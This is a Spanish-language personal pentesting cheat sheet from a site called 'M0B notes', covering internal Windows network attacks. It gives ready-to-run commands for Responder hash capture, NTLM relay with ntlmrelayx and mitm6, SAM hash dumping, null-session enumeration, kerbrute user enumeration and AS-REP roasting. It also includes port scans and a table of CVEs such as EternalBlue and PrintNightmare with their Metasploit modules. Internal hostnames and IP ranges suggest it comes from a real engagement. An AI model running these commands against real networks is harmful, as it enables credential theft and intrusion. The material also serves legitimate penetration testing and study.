<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>M0B notes</title>
  <meta name="description" content="&lt;h1 id=&quot;responder&quot;&gt;&lt;strong&gt;Responder&lt;/strong&gt;&lt;/h1&gt;">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link rel="icon" href="/M0B.png" type="image/png">
  <style>
    /* fallback si la hoja no carga */
    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
  </style>
  
  <script defer src="/assets/js/copy-code.js"></script>
</head>
<body>
  <header class="site-header">
    <div class="site-brand">
      <img class="brand-logo" src="/M0B.png" alt="logo" />
      <div class="brand-title">M0B notes</div>
    </div>
    <nav class="site-nav">
      <a href="/">Inicio</a>
      <a href="/puertos/">Puertos</a>
      <a href="/escalada/">Escalada</a>
      <a href="/web/">Web</a>
      <a href="/hackthebox/">HackTheBox</a>
      <a href="/real_life/">Real Life</a>
      <a href="/extras/">Extras</a>
    </nav>
  </header>

  <main>
    <div class="container">
      <h1 id="responder"><strong>Responder</strong></h1>

<p>Modo capturar hashes</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>responder <span class="nt">-I</span> eth0 <span class="nt">-wdF</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la /usr/share/responder/logs
</code></pre></div></div>

<p>Modo relay</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb ip/24 <span class="nt">--gen-relay-list</span> relay.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nano /etc/responder/Responder.conf
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Ponemos en OFF SMB y HTTP</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>responder <span class="nt">-I</span> eth0 <span class="nt">-FPv</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo impacket-ntlmrelayx.py  -tf relay.txt -smb2support 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb IP/24 <span class="nt">-U</span> USER <span class="nt">-H</span> HASH  <span class="nt">--local-auth</span> <span class="nt">--sam</span>
</code></pre></div></div>

<p>Modo relay IPV6</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 mitm6.py <span class="nt">-d</span> rmanj.com
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-ntlmrelayx <span class="nt">-6</span> <span class="nt">-wh</span> 10.17.0.213 <span class="nt">-tf</span> formated_relay.txt <span class="nt">-socks</span> <span class="nt">-debug</span> <span class="nt">-smb2support</span>
</code></pre></div></div>

<hr />

<p>Ver Host activos</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>arp-scan <span class="nt">-l</span> | <span class="nb">awk</span> <span class="s1">'/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}'</span> <span class="o">&gt;&gt;</span> ips.txt
<span class="nb">sudo </span>nmap <span class="nt">-sn</span>  10.17.0.0/24 <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/Up$/{print $2}'</span> <span class="o">&gt;&gt;</span> ips.txt
<span class="nb">cat </span>ips.txt | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="o">&gt;</span> ips2.txt
</code></pre></div></div>

<p>smb.txt</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb <span class="nt">-t</span> 10.17.0.0/24 
</code></pre></div></div>

<p>Nmap específico por puertos</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 445 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/445\/open/ {print $2}'</span> <span class="o">&gt;</span> 445.txt
nmap <span class="nt">-p</span> 22 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/22\/open/ {print $2}'</span> <span class="o">&gt;</span> 22.txt
nmap <span class="nt">-p</span> 21 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/21\/open/ {print $2}'</span> <span class="o">&gt;</span> 21.txt
nmap <span class="nt">-p</span> 3306 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/3306\/open/ {print $2}'</span> <span class="o">&gt;</span> 3306.txt
nmap <span class="nt">-p</span> 3389 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/3389\/open/ {print $2}'</span> <span class="o">&gt;</span> 3389.txt
nmap <span class="nt">-p</span> 1433 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/1433\/open/ {print $2}'</span> <span class="o">&gt;</span> 1433.txt
nmap <span class="nt">-p</span> 139 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/139\/open/ {print $2}'</span> <span class="o">&gt;</span> 139.txt
nmap <span class="nt">-p</span> 389 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/389\/open/ {print $2}'</span> <span class="o">&gt;</span> 389.txt
nmap <span class="nt">-p</span> 636 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/636\/open/ {print $2}'</span> <span class="o">&gt;</span> 636.txt
nmap <span class="nt">-p</span> 80 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/80\/open/ {print $2}'</span> <span class="o">&gt;</span> 80.txt
nmap <span class="nt">-p</span> 8080 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/8080\/open/ {print $2}'</span> <span class="o">&gt;</span> 8080.txt
nmap <span class="nt">-p</span> 443 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/443\/open/ {print $2}'</span> <span class="o">&gt;</span> 443.txt
nmap <span class="nt">-p</span> 23 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/23\/open/ {print $2}'</span> <span class="o">&gt;</span> 23.txt
</code></pre></div></div>

<p>SMB null session</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 445.txt <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> | <span class="nb">grep</span> <span class="s1">'\[+\]'</span>
nxc smb 445.txt <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--shares</span>
smbmap <span class="nt">-u</span> <span class="s1">'null'</span> <span class="nt">--host-file</span> smb_null.txt
smbmap <span class="nt">-u</span> <span class="s1">''</span> <span class="nt">--host-file</span> smb_null.txt
smbclient <span class="nt">-L</span> 10.17.0.229 <span class="nt">-N</span>
smbclient <span class="nt">-L</span> 10.17.0.229 <span class="nt">-N</span> <span class="nt">-m</span> SMB3
smbclient <span class="nt">-L</span> 10.17.0.229 <span class="nt">-N</span> <span class="nt">-m</span> SMB2
</code></pre></div></div>

<p>RPC null session</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read </span>ip<span class="p">;</span> <span class="k">do
	</span><span class="nb">echo</span> <span class="s2">"Probando null session RPC en </span><span class="nv">$ip</span><span class="s2"> "</span>
	rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nv">$ip</span> <span class="nt">-c</span> <span class="s2">"enumdomusers"</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Null session permitida en </span><span class="nv">$ip</span><span class="s2">"</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"No null session en </span><span class="nv">$ip</span><span class="s2">"</span>
<span class="k">done</span> &lt; 139.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while </span><span class="nb">read </span>ip<span class="p">;</span> <span class="k">do</span><span class="se">\n</span>  <span class="nb">echo</span> <span class="s2">"Probando null session RPC en </span><span class="nv">$ip</span><span class="s2">"</span><span class="se">\n</span>  impacket-lookupsid anonymous@rmanj.com <span class="nt">-target-ip</span> <span class="nv">$ip</span> <span class="nt">-no-pass</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Null session permitida en </span><span class="nv">$ip</span><span class="s2">"</span> <span class="o">||</span> <span class="nb">echo</span> <span class="s2">"No null session en </span><span class="nv">$ip</span><span class="s2">"</span><span class="se">\n</span><span class="k">done</span> &lt; 139.txt
</code></pre></div></div>

<p>RDP, comprobar NLA</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 3389 <span class="nt">-iL</span> 3389.txt <span class="nt">--script</span><span class="o">=</span>rdp-enum-encryption
nxc rdp <span class="nt">--nla-screenshot</span> 3389.txt | <span class="nb">grep</span> <span class="s2">"nla:False"</span>
<span class="nb">ls</span> <span class="nt">-lh</span> /home/user/.nxc/screenshots/
rdesktop <span class="nt">-u</span> <span class="s2">""</span> <span class="nt">-p</span> <span class="s2">""</span> IP
</code></pre></div></div>

<p>LDAP probar consultas anónimas</p>
<pre><code class="language-BASH">ldapsearch -x -H ldap://DOMAIN -s base  -b "" "(objectClass=*)"
ldapsearch -x -H ldap://DOMAIN -s base  -b "DC=,DC=" "(objectClass=*)"
ldapsearch -x -H ldap://DOMAIN -s base  -b "DC=,DC=" '(objectClass=*)'
</code></pre>

<p>Escanear páginas web rápido para saber si están activas</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 80 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/80\/open/ {print $2}'</span> <span class="o">&gt;</span> 80.txt
nmap <span class="nt">-p</span> 8080 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/8080\/open/ {print $2}'</span> <span class="o">&gt;</span> 8080.txt
nmap <span class="nt">-p</span> 443 10.17.0.0/24 <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">-oG</span> - | <span class="nb">awk</span> <span class="s1">'/443\/open/ {print $2}'</span> <span class="o">&gt;</span> 443.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'{print "http://"$0":80"}'</span> 80.txt <span class="o">&gt;&gt;</span> urls.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'{print "http://"$0":8080"}'</span> 8080.txt <span class="o">&gt;&gt;</span> urls.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'{print "https://"$0":443"}'</span> 443.txt <span class="o">&gt;&gt;</span> urls.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>unzip <span class="nt">-y</span>
wget https://github.com/projectdiscovery/httpx/releases/latest/download/httpx-linux-amd64.zip
unzip httpx-linux-amd64.zip
<span class="nb">chmod</span> +x httpx-linux-amd64<span class="se">\n</span><span class="nb">sudo mv </span>httpx-linux-amd64 /usr/local/bin/httpx

~/go/bin/httpx <span class="nt">-l</span> urls.txt <span class="nt">-sc</span> <span class="nt">-title</span> <span class="nt">-t</span> 50 <span class="nt">-timeout</span> 5
</code></pre></div></div>

<p>Listado de usuarios válidos</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute userenum <span class="o">&gt;</span> valid_users.txt

impacket-GetNPUsers DOMAIN/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> valid_users.txt <span class="nt">-dc-ip</span> IP
</code></pre></div></div>
<p>Wordlist para hacer password spraying
https://github.com/attackdebris/kerberos_enum_userlists.git</p>

<hr />

<p>Listar software vulnerable, primero hacer un nmap targeted, después:</p>

<p>mssql</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>mssql_targeted | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s1">'Nmap scan report|name: |number: '</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'Instance'</span> <span class="o">&gt;</span> vulnerable_mssql.txt
</code></pre></div></div>

<p>22.txt</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">awk</span> <span class="s1">'/Nmap scan report for/ {ip=$NF} /tcp/ &amp;&amp; /open/ &amp;&amp; /ssh/ {print ip, substr($0, index($0, $4))}'</span> 22_targeted 
</code></pre></div></div>

<hr />

<h1 id="puertos-típicos">Puertos típicos</h1>

<table>
  <thead>
    <tr>
      <th>Puerto</th>
      <th>Servicio común</th>
      <th>Riesgos frecuentes / Exploits conocidos</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><strong>21</strong></td>
      <td>FTP</td>
      <td>Contraseñas en texto plano, anon login, RCE (vsftpd backdoor, etc.)</td>
    </tr>
    <tr>
      <td><strong>22</strong></td>
      <td>SSH</td>
      <td>Bruteforce, versiones viejas de OpenSSH (7.x, 8.x) con CVEs</td>
    </tr>
    <tr>
      <td><strong>23</strong></td>
      <td>Telnet</td>
      <td>Texto plano, acceso sin cifrar, default creds</td>
    </tr>
    <tr>
      <td><strong>25</strong></td>
      <td>SMTP</td>
      <td>Relay abierto, RCE por buffer overflow</td>
    </tr>
    <tr>
      <td><strong>53</strong></td>
      <td>DNS</td>
      <td>Cache poisoning, DoS, zone transfer</td>
    </tr>
    <tr>
      <td><strong>80</strong></td>
      <td>HTTP</td>
      <td>Web vulns (LFI, RCE, XSS, SQLi), paneles sin auth</td>
    </tr>
    <tr>
      <td><strong>110</strong></td>
      <td>POP3</td>
      <td>Texto plano, credenciales expuestas</td>
    </tr>
    <tr>
      <td><strong>135</strong></td>
      <td>RPC</td>
      <td>Windows RCE (MS03-026, DCOM, etc.)</td>
    </tr>
    <tr>
      <td><strong>139</strong></td>
      <td>NetBIOS</td>
      <td>Enumeración, ataques LLMNR/NetBIOS</td>
    </tr>
    <tr>
      <td><strong>143</strong></td>
      <td>IMAP</td>
      <td>Texto plano, default creds</td>
    </tr>
    <tr>
      <td><strong>389</strong></td>
      <td>LDAP</td>
      <td>Enumeración, credenciales en texto plano</td>
    </tr>
    <tr>
      <td><strong>445</strong></td>
      <td>SMB</td>
      <td>MS17-010 (EternalBlue), RCE, cred capture (Responder)</td>
    </tr>
    <tr>
      <td><strong>512-514</strong></td>
      <td>R* services</td>
      <td>RSH/Rlogin inseguros</td>
    </tr>
    <tr>
      <td><strong>3306</strong></td>
      <td>MySQL</td>
      <td>Default creds, inyecciones</td>
    </tr>
    <tr>
      <td><strong>3389</strong></td>
      <td>RDP</td>
      <td>Bruteforce, BlueKeep (CVE-2019-0708), cred reuse</td>
    </tr>
    <tr>
      <td><strong>5432</strong></td>
      <td>PostgreSQL</td>
      <td>Default users, inyecciones SQL</td>
    </tr>
    <tr>
      <td><strong>5900</strong></td>
      <td>VNC</td>
      <td>Sin autenticación, acceso completo</td>
    </tr>
    <tr>
      <td><strong>5985/5986</strong></td>
      <td>WinRM</td>
      <td>RCE si hay credenciales disponibles</td>
    </tr>
    <tr>
      <td><strong>8000-9000</strong></td>
      <td>Web apps/dev services</td>
      <td>Jenkins, Tomcat, Jupyter, etc. → muchos sin auth por defecto</td>
    </tr>
    <tr>
      <td><strong>9200</strong></td>
      <td>Elasticsearch</td>
      <td>RCE, info leak si sin auth</td>
    </tr>
    <tr>
      <td><strong>11211</strong></td>
      <td>Memcached</td>
      <td>Amplification DDoS</td>
    </tr>
  </tbody>
</table>

<h1 id="vuns-típicas">Vuns típicas</h1>

<p>| Nombre             | CVE            | Servicio              | Descripción                                          | Explotable en Metasploit                             |
| —————— | ————– | ——————— | —————————————————- | —————————————————- |
| <strong>EternalBlue</strong>    | CVE-2017-0144  | SMBv1 (445)           | RCE por buffer overflow en SMBv1 (Win7, Win2008, XP) | ✅ Sí (<code class="language-plaintext highlighter-rouge">exploit/windows/smb/ms17_010_eternalblue</code>)    |
| <strong>SMBGhost</strong>       | CVE-2020-0796  | SMBv3 (445)           | RCE en SMBv3.1.1 (Windows 10/2019)                   | ✅ (scripts y PoCs)                                   |
| <strong>BlueKeep</strong>       | CVE-2019-0708  | RDP (3389)            | RCE en Remote Desktop (Win7/Server 2008)             | ✅ (<code class="language-plaintext highlighter-rouge">exploit/windows/rdp/cve_2019_0708_bluekeep_rce</code>) |
| <strong>PrintNightmare</strong> | CVE-2021-34527 | RPC/Spooler (135/445) | RCE por falla en spooler                             | ✅ (<code class="language-plaintext highlighter-rouge">exploit/windows/local/printnightmare</code>)           |
Escáneres :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 10.17.0.0/24 <span class="nt">-M</span> eternalblue
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 10.17.0.0/24 <span class="nt">-M</span> printnightmare
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 10.17.0.0/24 <span class="nt">-M</span> smbghost
</code></pre></div></div>

      <div class="footer">
        <span class="muted">© 2025 · Generado con Jekyll</span>
      </div>
    </div>
  </main>
</body>
</html>

